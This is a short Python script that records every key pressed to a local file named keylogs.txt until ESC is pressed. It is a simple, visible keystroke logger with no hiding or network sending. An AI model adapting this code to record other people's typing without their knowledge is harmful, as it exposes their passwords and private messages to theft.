import keyboard

def record_keystrokes():
    try:
        with open('keylogs.txt', 'a') as f:
            print("Press ESC to stop recording keystrokes.")
            while True:
                key = keyboard.read_key()
                if key == 'esc':
                    break
                elif key in ['space', 'enter']:
                    f.write('[' + key.upper() + ']' + '\n')
                else:
                    f.write(key)

    except Exception as e:
        print("An error occurred while recording keystrokes:", str(e))

if __name__ == "__main__":
    record_keystrokes()